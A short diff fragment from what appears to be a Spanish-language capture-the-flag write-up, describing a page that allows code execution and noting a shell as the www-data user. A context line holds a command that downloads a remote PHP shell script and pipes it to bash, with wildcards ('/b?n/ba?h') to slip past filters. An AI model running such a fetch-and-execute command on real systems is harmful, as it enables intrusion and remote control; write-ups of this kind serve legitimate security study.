@@ -55,3 +55,4 @@ tenemos una pagina que al parecer nos permite ejecutar codigo
 	curl 10.8.203.6:8000/shellencod.php | /b?n/ba?h
 ```
 ### somos el usuario www-data
+hemos intentado hace
